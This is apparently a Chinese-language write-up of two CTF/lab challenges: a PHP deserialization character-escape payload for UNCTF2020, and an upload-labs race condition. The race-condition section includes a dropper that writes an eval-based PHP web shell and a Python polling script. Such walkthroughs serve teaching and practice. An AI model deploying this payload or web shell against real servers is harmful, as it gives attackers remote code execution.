## UNCTF2020-easyunserialize

一道反序列化字符逃逸的题目

```php
<?php 
error_reporting(0); 
highlight_file(__FILE__);

class a 
{ 
    public $uname; 
    public $password; 
    public function __construct($uname,$password) 
    { 
        $this->uname=$uname; 
        $this->password=$password; 
    } 
    public function __wakeup() 
    { 
            if($this->password==='easy') 
            { 
                include('flag.php'); 
                echo $flag;     
            } 
            else 
            { 
                echo 'wrong password'; 
            } 
        } 
    } 

function filter($string){ 
    return str_replace('challenge','easychallenge',$string); 
} 

$uname=$_GET[1]; 
$password=1; 
$ser=filter(serialize(new a($uname,$password))); 
$test=unserialize($ser); 
?> 
```

这道题把password写死了为1，我们要想办法控制password这个参数

这时就想到了字符逃逸

先序列化一下原来的字符串

```
O:1:"a":2:{s:5:"uname";s:1:"a";s:8:"password";i:1;}
```

然后password改一下

```
O:1:"a":2:{s:5:"uname";s:1:"a";s:8:"password";s:4:"easy";}
```

计算得到需要逃逸的字符数有29个，`challenge`替换成`easychallenage`每次就逃逸4个字符，倍数对不上那怎么办呢

那就直接在后面加多几个字符

构造payload

```
challengechallengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";win}
```

就可以得到flag了

## upload-labs 17（条件竞争）

这道题利用到了一个条件竞争

```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}

```

他会把不合法的文件给删除掉，但是如果是多线程还没有处理完我们就访问的话就有可能会绕过防护

先上传一个shell1.php

```
<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST['cmd'])?>');?>
```

利用burp的爆破功能无限上传

![image-20210921120135861](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210921120135861.png)

然后写一个python脚本去访问

```python
import requests
url = "http://127.0.0.1/upload/shell1.php"
url_2 = "http://127.0.0.1/upload/shell.php"
while True:
    html = requests.get(url)
    html_2 = requests.get(url_2)
    if html_2.status_code == 200:  # 判断shell.php是否写入成功
        print("OK")
        break
```

出来ok之后就说明已经上传成功了，利用蚁剑去连接

![image-20210921115940137](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210921115940137.png)

